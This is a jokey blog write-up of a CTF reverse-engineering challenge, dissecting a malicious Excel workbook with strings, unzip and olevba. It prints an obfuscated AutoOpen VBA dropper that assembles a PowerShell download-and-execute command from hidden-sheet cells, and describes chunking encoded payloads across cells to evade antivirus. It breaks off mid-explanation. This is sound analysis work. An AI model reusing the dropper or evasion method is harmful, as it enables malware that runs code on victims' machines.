+++
title = "Watching My Macros"
date = "2025-01-29"
author = "NuclearFarmboy"
description = "For once I am trying to look at a malware dropper in Excel rather than trying to write it."
+++

{{< image src="/img/macro_reverse_engineering/alwayshasbeen.png" alt="And always will be..." position="center" style="width: 500px; height:auto;" >}}

# Let's Reverse Engineer a Malicious Excel Macro!
### The Backstory
**(NOTE: I began writing this in April of 2024, but since then I decided to get married so that put a delay on stuff!)**

A few weeks ago I had some free time after playing enough *Helldivers II* for one evening (I totally didn't have to stop because I got a hand cramp), I decided to do my other computer hobby: CTFs. As you may all know, a Capture The Flag (CTF) competition is an event where you can put your computer skills to the test and solve fun(?) challenges and potentially win cool prizes! In my case I am not a very competitive person so I do these more often than not to just stretch the ol' brain and learn something cool, try some new technique, or to just muck about because I got a hand cramp playing *Helldivers II*. 

##### (This post was not sponsored by *Helldivers II*, Super Earth, or Managed Democracy) 

This particular weekend I was looking at the ["UTCTF 2024"](https://www.isss.io/utctf/) competition despite the fact that I, as a Fightin' Texas Aggie, refuse to acknowledge that the University of Texas at Austin is a place of higher education. Regardless of these religious beliefs, I figured it would be fun to do a challenge or two, or at least attempt to. 

### The Challenge
This CTF was done jeopardy style, which meant that instead of doing some attacking and/or defending services or hosts in a live network, the game masters instead have a board of challenges separated by categories where you can go in and select whatever challenge you are interested in! This year's categories were: 
* Cryptography 
* Forensics 
* Reverse Engineering 
* Web 
* Misc.

Now I'll be real honest, I am not a cryptographer. I like math, have an engineering degree, but even I am like "nah dawg". As for Forensics, unfortunately all of my *CSI: Miami* knowledge is not very useful for this type of forensics. Reverse Engineering? Oooh, now that's a maybe. 

To be fair I did spend some time in Burp Suite and doing web stuff but I kept coming back to one Reverse Engineering challenge called "Fruit Deals". The prompt is simple:


{{< image src="/img/macro_reverse_engineering/fruit_deals.png" alt="I make the best deals" position="center" style="width: 500px; height:auto;" >}}

{{< caption caption="I have seen people enable macros for less." >}}

So the assignment seems simple enough right? Download the ```deals.xlsm```, see what malware it downloads (or tries to), and bing bam boom, we got ourselves a flag. 

Now I wouldn't be doing my boys *Danger Chad* and *Tarik The Malware Chef* proud (their reversing level is over 9000) if I didn't take a systematic approach to this and actually try to do this like, y'know, **A PROFESSIONAL**. So to do that, I came up with an attack plan and began trying to figure out what exactly was inside...

### Coming Up With a Plan

At first the plan was to just open the Excel spreadsheet in a Windows machine and just YOLO it, and see whatever that macro downloaded and executed. Now you're probably thinking, 

***"But Cervando, that is reckless! you don't know what the malware does!"*** 

To which I just say 

***"Trust me, I'm a Pro."***

Which is just a rebrand of my catchphrase I've said since I was a child ***"I'm about to try something stupid here."*** which never failed to terrify my parents and teachers.

Nevertheless, I do concede that just clicking the **YOLO** *"Enable Macros"* button on the spreadsheet doesn't seem the most methodical approach so I decided to do something closer to the scientific method and make my 6th grade science teacher Mr. Connor proud. 

So here is:

### "Cervando's Approach For Examining Potentially Malicious Spreadsheets While Being Only a Slight Idiot"™️

#### Step 1. "Strings on Strings"
I figured I would do the basic thing everyone does whenever you find an unknown file and just Use ```strings``` to examine the file and see if anything interesting is happening. The full output of strings is available at: https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/deals_strings.txt 

{{< image src="/img/macro_reverse_engineering/strings.gif" alt="So many strings" position="center" style="width: 500px; height:auto;" >}}

Looking through it, we see a lot of junk as expected, but doing some browsing I was able to find some interesting strings that at least gave me some idea of what is going on with the file. As seen here we see that there are at least 3 sheets in this workbook. 

{{< image src="/img/macro_reverse_engineering/sheets.png" alt="A freak in the spreadsheets" position="center" style="width: 500px; height:auto;" >}}

You're probably asking (or not, I'm not a mind reader) ***Why is this important?*** and the reason is that a common evasion technique in Excel is to **HIDE** sheets with information. In normal usage, you may want to hide sheets that you're not using, sheets that are there only to do some background calculations or look up tables. 

But if you're a bad guy, (Alexa play "Bad Guy" by Billie Eilish) you sometimes hide stuff in sheets to obfuscate their shenanigans. Examples of stuff I have hidden in the sheet cells:
1. Base64 encoded malicious payloads
2. Base64 encoded memes for whoever finds them
3. Base64 encoded dank memes for whoever finds them
4. Configurations for the VBA script or as input to the executable I drop on disk
5. Malicious DLLs
6. So many memes

The reason for this is that if someone opens your VBA macro you don't want them to see your malicious payload. Windows Defender will do this and even scan the blobs of Base64 encoded text to see if you're trying to do something sneaky. On the other hand, what you can do is:
1. Encode the payload
2. Chunk the payload into short strings that are only a few bytes long
3. Put them in random cells on a sheet
4. Tell your macro what cells contain the the strings
5. Have your macro read the cells and reassemble the blob in order
6. Decode the blob
7. ???
8. Profit


At this point in our adventure we do not know if that is the case, but it is something we need to keep an eye out for when we open the spreadsheet and try to account for all the sheets while we try to get them sweet, sweet deals. For now let's pivot to something else as we gather our information.


#### Step 2. "X Gon' Give It To Ya"
Fun fact: modern **Microsoft Office** file formats are actually compressed ```.zip``` files full of XML. So for Step 2, I decided to convert the ```.xlsm``` to a ```.zip``` and just examine the its contents. Converting this file and unzipping it into a directory called ```deals``` is what we in the biz call a pro-hackerman level move (not really):
```bash
unzip deals.xlsm -d deals
```
Notice how we didn't even have to convert the the file from ```.xlsm``` to ```.zip``` because you can't always judge a file by its extension. And when we run that we see several things inflate, because even Excel isn't safe from inflation:

{{< image src="/img/macro_reverse_engineering/deals_unzipped.png" alt="Neato" position="center" style="width: 500px; height:auto;" >}}

*The More You Know 🌠*

But wait! Do you see it?

Look closely!

***ALEXA, ENHANCE***

{{< image src="/img/macro_reverse_engineering/deals_unzipped.gif" alt="I got you now!" position="center" style="width: 500px; height:auto;" >}}

There it is!

Here we see that there exists a file called ```deals/xl/vbaProject.bin```. This means that there *might* be a macro here for us to look at! So lets do some investigating!

But before we go we also want to do some digging into the ```deals/xl/workbook.xml``` to be sure we arent missing anything, and because I want to see if my hunch of hidden sheets was correct. If you want to see this, it is available at https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/workbook.xml

The first thing I see is that my hunch was right! There's two hidden sheets! Let's keep that in mind as we move forward.

{{< image src="/img/macro_reverse_engineering/workbookxml_1.png" alt="So sneaky" position="center" style="width: 500px; height:auto;" >}}

I even double checked my work by doing some *find and replace* magic where I replaced all ```<``` with ```\n<``` to add some new lines and make it more human readable, and sure enough, those sheets are there, and we can see that they are being sneaky.

{{< image src="/img/macro_reverse_engineering/workbookxml_2.png" alt="don't be suspicious" position="center" style="width: 500px; height:auto;" >}}

So let's keep that in mind as we continue our journey!

#### Step 3. CSI: VBA
Back to the ```vbaProject.bin``` file, we first want to see a few things like is it empty, what does it do, where it's boyfriend at, does it like Mike & Ikes, etc. So just by doing a quick look into it we see that it is 31Kb, meaning that odds are there is *SOME* data in there. So that's nice. 

{{< image src="/img/macro_reverse_engineering/vbaproject_info1.png" alt="The plot thickens" position="center" style="width: 500px; height:auto;" >}}

Now the problem is that this is a ```.bin``` file, AKA binary data AKA this VBA isn't particularly friendly to read. Additionally this could be password protected (if you're sneaky). So what can we do?

Now I'mma be honest with you dawg (don't know why I called you dawg, but I'm sticking with it), my initial cowboy senses tell me to just fire this up in Windows, open it in Excel, examine the macro and see what I can do. BUT thankfully people with much more sense than me have made tools to y'know *NOT* do the things I want to do, because my approach is too much Panic and not enough Disco. 

Doing some searching on the World Wide Web, I found this tool in python called [python-oletools](https://github.com/decalage2/oletools) which has a package specifically for extracting the **SOURCE CODE** of VBA macros from the Excel from OpenXML files (the Microsoft Office kind we have been looking at), as well as do some simple static analysis of suspicious VBA keywords and common obfuscation methods! How neat is that? So let's take it for a spin and send the results to a text file with:

```bash
olevba vbaProject.bin > vbasourcecode.txt
```

Now the resulting file is pretty long to easily show, and is available at: 

https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/vbasourcecode.txt

Or it's also viewable here:

{{< code language="text" title="vbasourcecode.txt" expand="expand" collapse="hide" isCollapsed="true">}}XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.11.6 - http://decalage.info/python/oletools
===============================================================================
FILE: vbaProject.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FillWithRandomBase64()
    Dim ws As Worksheet
    Dim rng As Range
    Dim i As Long
    Dim base64String As String
    
    ' Set worksheet
    Set ws = ThisWorkbook.Sheets("Sheet2") ' Change "Sheet1" to your sheet name
    
    ' Set range where you want to fill the base64 strings
    Set rng = ws.Range("A1:AA100") ' Change "A1:A100" to your desired range
    
    ' Clear previous content
    rng.ClearContents
    
    ' Seed the random number generator
    Randomize
    
    ' Loop through each cell in the range and fill with random base64 strings
    For i = 1 To rng.Cells.Count
        base64String = GenerateRandomBase64()
        rng.Cells(i).Value = base64String
    Next i
End Sub

Function GenerateRandomBase64() As String
    Dim base64Chars As String
    Dim i As Integer
    Dim base64String As String
    
    ' Define Base64 characters
    base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    ' Generate random Base64 string
    For i = 1 To 8 ' Generates an 8-character Base64 string (which would correspond to 6 bytes of data)
        base64String = base64String & Mid(base64Chars, Int((Len(base64Chars) * Rnd) + 1), 1)
    Next i
    
    GenerateRandomBase64 = base64String
End Function
-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: vbaProject.bin - OLE stream: 'VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Dim Retval
Dim f As String
Dim t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d, e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e As String
xc6fd40b407cb3aac0d068f54af14362e = "$OrA, "
If Sheets("Sheet2").Range("M62").Value = "Iuzaz/iA" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
End If
If Sheets("Sheet2").Range("G80").Value = "bAcDPl8D" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
End If
e5b138e644d624905ca8d47c3b8a2cf41 = " = '"
If Sheets("Sheet2").Range("P31").Value = "aI3bH4Rd" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "http"
End If
If Sheets("Sheet2").Range("B50").Value = "4L3bnaGQ" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "://f"
End If
If Sheets("Sheet2").Range("B32").Value = "QyycTMPU" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "e-Ite"
End If
If Sheets("Sheet2").Range("K47").Value = "0kIbOvsu" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "m $jri"
End If
If Sheets("Sheet2").Range("B45").Value = "/hRdSmbG" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + ";brea"
End If
If Sheets("Sheet2").Range("D27").Value = "y9hFUyA8" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "ruit"
End If
If Sheets("Sheet2").Range("A91").Value = "De5234dF" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".ret3"
End If
If Sheets("Sheet2").Range("I35").Value = "DP7jRT2v" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".gan"
End If
If Sheets("Sheet2").Range("W48").Value = "/O/w/o57" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "k;} c"
End If
If Sheets("Sheet2").Range("R18").Value = "FOtBe4id" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "atch "
End If
If Sheets("Sheet2").Range("W6").Value = "9Vo7IQ+/" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "{}"""
End If
If Sheets("Sheet2").Range("U24").Value = "hmDEjcAE" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "g/ma"
End If
If Sheets("Sheet2").Range("C96").Value = "1eDPj4Rc" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "lwar"
End If
If Sheets("Sheet2").Range("B93").Value = "A72nfg/f" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".rds8"
End If
If Sheets("Sheet2").Range("E90").Value = "HP5LRFms" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
End If
tfd753b886f3bd1f6da1a84488dee93f9 = "akrz"
If Sheets("Sheet2").Range("G39").Value = "MZZ/er++" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "f3zsd"
End If
If Sheets("Sheet2").Range("B93").Value = "ZX42cd+3" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2832"
End If
If Sheets("Sheet2").Range("I15").Value = "e9x9ME+E" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "0918"
End If
If Sheets("Sheet2").Range("T46").Value = "7b69F2SI" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2afd"
End If
If Sheets("Sheet2").Range("N25").Value = "Ga/NUmJu" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "CNTA"
End If
If Sheets("Sheet2").Range("N26").Value = "C1hrOgDr" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + " = '"
End If
If Sheets("Sheet2").Range("C58").Value = "PoX7qGEp" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "banA"
End If
If Sheets("Sheet2").Range("B53").Value = "see2d/f" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "Fl0dd"
End If
If Sheets("Sheet2").Range("Q2").Value = "VKVTo5f+" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "NA-H"
End If
t53df028c67b2f07f1069866e345c8b85 = "p"
If Sheets("Sheet2").Range("L84").Value = "GSPMnc83" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "oWe"
End If
If Sheets("Sheet2").Range("H35").Value = "aCxE//3x" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "ACew"
End If
If Sheets("Sheet2").Range("R95").Value = "uIDW54Re" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "Rs"
End If
If Sheets("Sheet2").Range("A24").Value = "PKRtszin" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "HELL"
End If
If Sheets("Sheet2").Range("G33").Value = "ccEsz3te" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "L3c33"
End If
If Sheets("Sheet2").Range("P31").Value = "aI3bH4Rd" Then
t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + " -c"
End If

If Sheets("Sheet2").Range("Z49").Value = "oKnlcgpo" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "4';$"
End If
If Sheets("Sheet2").Range("F57").Value = "JoTVytPM" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "jri="
End If
If Sheets("Sheet2").Range("M37").Value = "y7MxjsAO" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "$env:"
End If
If Sheets("Sheet2").Range("E20").Value = "ap0EvV5r" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "publ"
End If
z92ea38976d53e8b557cd5bbc2cd3e0f8 = "\'+$"
If Sheets("Sheet2").Range("D11").Value = "Q/GXajeM" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "CNTA"
End If
If Sheets("Sheet2").Range("B45").Value = "/hRdSmbG" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "+'.ex"
End If
If Sheets("Sheet2").Range("D85").Value = "y4/6D38p" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "e';tr"
End If
If Sheets("Sheet2").Range("P2").Value = "E45tTsBe" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "4d2dx"
End If
If Sheets("Sheet2").Range("O72").Value = "lD3Ob4eQ" Then
tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "ic+'"
End If
qe32cd94f940ea527cf84654613d4fb5d = "omm"
If Sheets("Sheet2").Range("P24").Value = "d/v8oiH9" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "and"
End If
If Sheets("Sheet2").Range("V22").Value = "dI6oBK/K" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " """
End If
If Sheets("Sheet2").Range("G1").Value = "zJ1AdN0x" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$oa"
End If
If Sheets("Sheet2").Range("Y93").Value = "E/5234dF" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "e$3fn"
End If
If Sheets("Sheet2").Range("A12").Value = "X42fc3/=" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "av3ei"
End If
If Sheets("Sheet2").Range("F57").Value = "JoTVytPM" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "K ="
End If
If Sheets("Sheet2").Range("L99").Value = "t8PygQka" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " ne"
End If
If Sheets("Sheet2").Range("X31").Value = "gGJBD5tp" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "w-o"
End If
If Sheets("Sheet2").Range("C42").Value = "Dq7Pu9Tm" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bjec"
End If
If Sheets("Sheet2").Range("D22").Value = "X42/=rrE" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "aoX3&i"
End If
If Sheets("Sheet2").Range("T34").Value = "9u2uF9nM" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
End If
If Sheets("Sheet2").Range("G5").Value = "cp+qRR+N" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t.We"
End If
If Sheets("Sheet2").Range("O17").Value = "Q8z4cV/f" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bCli"
End If
If Sheets("Sheet2").Range("Y50").Value = "OML7UOYq" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "ent;"
End If
If Sheets("Sheet2").Range("P41").Value = "bG9LxJvN" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$OrA"
End If
If Sheets("Sheet2").Range("L58").Value = "qK02fT5b" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "y{$oa"
End If
If Sheets("Sheet2").Range("P47").Value = "hXelsG2H" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "K.Dow"
End If
If Sheets("Sheet2").Range("A2").Value = "RcPl3722" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "Ry.is"
End If
If Sheets("Sheet2").Range("G64").Value = "Kvap5Ma0" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "nload"
End If
If Sheets("Sheet2").Range("H76").Value = "OjgR3YGk" Then
z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "File("
End If
f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 + z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
Retval = Shell(f, 0)
Dim URL As String
URL = "https://www.youtube.com/watch?v=mYiBdMnIT88"
ActiveWorkbook.FollowHyperlink URL
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: vbaProject.bin - OLE stream: 'VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://www.youtube.|URL                                          |
|          |com/watch?v=mYiBdMnI|                                             |
|          |T88                 |                                             |
|Base64    |l)b                 |bCli                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
{{< /code >}}

Now I admit that's a lot of code, but let's digest it piece by piece by starting at the bottom with the security scan provided by olevba:

```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://www.youtube.|URL                                          |
|          |com/watch?v=mYiBdMnI|                                             |
|          |T88                 |                                             |
|Base64    |l)b                 |bCli                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
```
We see that it found some interesting indicators of compromise (IOCs) and potentially malicious things! It found that:
- this VBA file somewhere utilizes the ```AutoOpen``` subroutine which is VBAs way of running the macro as soon as the workbook is opened
- this VBA file somehwere uses the ```Shell``` command which may run a command on the command line
- some Hex encoded strings
- **some Base64 encoded strings**
- and... a YouTube link that would take you to a straight up banger of a song. Now this link has since been taken down but it did have this vibe to it:
{{< youtube S1jWdeRKvvk >}}


Now we could take the ```olevba --decode``` route to see what the Base64 strings say, but first let's keep exploring and look at what else is in this **VB**i**A**tch. Taking these results from the top, the first thing we see is that olevba found 3 ```.cls``` objects named *ThisWorkbook, Sheet1,* and *Sheet2*. Very imaginative. After 10 whole minutes on of reading I learned that ```.cls``` objects in VBA are *Class Modules* and have properties and methods that exist separately for each instance of the class. Neat. Basically the data of a specific instance of the class only exists for that instance even if there are multiple copies. Neat huh? But they're empty so who cares. 

```
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
```

After this we start getting into the juicy bits, and see that there are two ```.bas``` modules in this macro aptly namned *Module1* and *Module2*. Someone felt daring that day. Asking the oracle of all wisdom, Stack Overflow, what this meant I learned that ```.bas``` objects in VBA are *Standard Modules* (seriously, who names these things?) and they differ from *Class Modules* in that they have methods and variables that are used globally and there is only a single instance of the data for the entire program. Neat. VBA is stupid. Thankfully these are not empty and we can start digging into what these do starting with *Module1*:

{{< code language="visual-basic" title="Module1.bas" expand="expand" collapse="hide" isCollapsed="false">}}Sub FillWithRandomBase64()
    Dim ws As Worksheet
    Dim rng As Range
    Dim i As Long
    Dim base64String As String
    
    ' Set worksheet
    Set ws = ThisWorkbook.Sheets("Sheet2") ' Change "Sheet1" to your sheet name
    
    ' Set range where you want to fill the base64 strings
    Set rng = ws.Range("A1:AA100") ' Change "A1:A100" to your desired range
    
    ' Clear previous content
    rng.ClearContents
    
    ' Seed the random number generator
    Randomize
    
    ' Loop through each cell in the range and fill with random base64 strings
    For i = 1 To rng.Cells.Count
        base64String = GenerateRandomBase64()
        rng.Cells(i).Value = base64String
    Next i
End Sub

Function GenerateRandomBase64() As String
    Dim base64Chars As String
    Dim i As Integer
    Dim base64String As String
    
    ' Define Base64 characters
    base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    ' Generate random Base64 string
    For i = 1 To 8 ' Generates an 8-character Base64 string (which would correspond to 6 bytes of data)
        base64String = base64String & Mid(base64Chars, Int((Len(base64Chars) * Rnd) + 1), 1)
    Next i
    
    GenerateRandomBase64 = base64String
End Function
{{< /code >}}

Starting from the top we see some variables as denoted by the ```Dim```, but more importantly we see that whoever wrote this VBA script is part of the ***Cervando Exploit Research and Vulnerability Assessment Network for Developing Sinister and Unsavory Code Knowledge and Skills*** or the **CERVANDOSUCKS** (still working on the acronym). We can tell they are part of CERVANDOSUCKS becuase like him, AKA me, they just YOLO'd and got lazy and deployed their malicious code **INCLUDING THEIR COMMENTS EXPLAINING WHAT EACH PART OF THE CODE DOES AS WELL AS VERY DESCRIPTIVE SUBROUTINE AND FUNCTION NAMES**. Which is fun to see, but I get a feeling someone got a little *skiddy* with this as the comments even tell you to change the name of *Sheet1* to whatever your sheet name is.

Sorry I got excited. *\*DEEP BREATH\**. Ok. I'm good. In case you can't see what I mean I will explain what we see in this module!

Let's start by looking at lines ```7``` and ```8```:
{{< code language="visual-basic" title="Module1.bas lines:7-8" expand="expand" collapse="hide" isCollapsed="false">}}	'Set worksheet
    Set ws = ThisWorkbook.Sheets("Sheet2") ' Change "Sheet1" to your sheet name
{{< /code >}}

Here we see the comments ```Set Worksheet ... Change "Sheet1" to your sheet name```. By  analyzing this we can deduce that whoever wrote this code left the comments in and probably copied this piece of code from somewhere else and that this module was likely posted somewhere as a proof of concept and had the variable ```ws``` set to reference ```Sheet1```. Our hackerman who took that code and modified it changed that dedfault reference to ```Sheet2``` since he wanted ```Sheet1```to be the ```Deals``` sheet we saw in ```workbook.xml``` and I am deducing that they wanted ```Sheet2``` to be where they cooked.  

Continuing our sleuthing, we look at the next block two blocks of code we see a pretty big hint of what the module is doing:
{{< code language="visual-basic" title="Module1.bas lines:10-14" expand="expand" collapse="hide" isCollapsed="false">}}	' Set range where you want to fill the base64 strings
    Set rng = ws.Range("A1:AA100") ' Change "A1:A100" to your desired range
    
    ' Clear previous content
    rng.ClearContents
{{< /code >}}

The comment ```Set range where you want to fill the base64 strings``` shows us that we are in fact filling in Base64 encoded strings into ```Sheet2```! Furthermore we also see that that the variable ```rng``` is set to specify the range of cells that is going to be filled by these Base64 strings, as well as making sure that all of those cells are empty before the module writes to it. It is important to note that whoever copied this module took the liberty of changing the range from ```A1:A100``` to ```A1:AA100```. So instead of 100 cells of Base64 cells, they wanted to fill out 2,700 cells! That's a lot of data yo! 

And moving along we see what they wanted to accomplish with all these cells in lines ```16``` through ```23```:
